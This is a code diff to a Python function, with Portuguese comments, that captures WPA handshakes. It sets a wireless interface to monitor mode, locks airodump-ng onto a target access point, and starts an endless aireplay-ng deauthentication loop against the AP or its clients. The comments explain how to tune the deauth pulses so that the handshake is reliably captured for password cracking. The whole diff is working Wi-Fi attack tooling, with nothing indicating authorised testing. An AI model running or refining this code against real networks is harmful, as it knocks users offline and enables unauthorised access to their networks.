@@ -413,7 +413,6 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
         return {"ok": False, "error": "nenhum BSSID alvo"}
     bssid = bssids[0]
     ch = str(channels[0]) if channels else "1"
-    multi = len(bssids) > 1 or len(channels) > 1
     for f in glob.glob(f"{WORK}/cap-*"):
         try:
             os.remove(f)
@@ -422,16 +421,15 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
     _cleanup_iface(iface)
     if not _set_monitor(iface):
         return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
-    if not multi:
-        _sh(f"iw dev {iface} set channel {ch} HT20", timeout=8)
+    # FOCA sempre em 1 BSSID + canal fixo. Handshake precisa do airodump parado
+    # no canal do alvo pra pegar M1-M4 em sequencia; channel hopping nao pega.
+    # Capturar o handshake de 1 AP do mesh ja serve (a senha e a mesma).
+    _sh(f"iw dev {iface} set channel {ch} HT20", timeout=8)
     _last_hs.update(ts=0, n=0)
     _capture["saved"] = None
-    airo_args = ["airodump-ng", "-w", f"{WORK}/cap", "--output-format", "pcap"]
-    if not multi:
-        airo_args += ["-c", ch, "--bssid", bssid]
-    airo_args.append(iface)
     airo = subprocess.Popen(
-        airo_args,
+        ["airodump-ng", "-c", ch, "--bssid", bssid,
+         "-w", f"{WORK}/cap", "--output-format", "pcap", iface],
         stdout=open(f"{WORK}/airo.log", "w"), stderr=subprocess.STDOUT,
         preexec_fn=os.setsid,
     )
@@ -440,22 +438,19 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
         clients_macs = clients_macs or []
         dlog = f"{WORK}/deauth.log"
         if clients_macs:
-            cmds = []
-            for b in bssids:
-                for cm in clients_macs:
-                    cmds.append(f"aireplay-ng --deauth 8 -a {b} -c {cm} {iface} >>{dlog} 2>&1")
-            loop = "; ".join(cmds)
-            deauth_proc = subprocess.Popen(
-                ["bash", "-c", f"sleep 3; for i in $(seq 1 10); do {loop}; sleep 6; done"],
-                preexec_fn=os.setsid,
-            )
+            # direcionado aos clientes conhecidos (mais eficaz pra forcar handshake)
+            inner = "; ".join(
+                f"aireplay-ng --deauth 4 -a {bssid} -c {cm} {iface} >>{dlog} 2>&1"
+                for cm in clients_macs)
         else:
-            cmds = [f"aireplay-ng --deauth 5 -a {b} {iface} >>{dlog} 2>&1" for b in bssids]
-            loop = "; ".join(cmds)
-            deauth_proc = subprocess.Popen(
-                ["bash", "-c", f"sleep 3; {loop}"],
-                preexec_fn=os.setsid,
-            )
+            inner = f"aireplay-ng --deauth 4 -a {bssid} {iface} >>{dlog} 2>&1"
+        # loop continuo e GENTIL: pulsos pequenos (4 frames) a cada 10s. Forca
+        # reconexao sem bombardear (deauth agressivo faz o AP renovar o ANONCE
+        # e estraga o handshake).
+        deauth_proc = subprocess.Popen(
+            ["bash", "-c", f"sleep 4; while true; do {inner}; sleep 10; done"],
+            preexec_fn=os.setsid,
+        )
     _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
                      "targets": bssids, "iface": iface, "essid": essid,
                      "mode": mode, "bssid": bssid, "ch": ch})
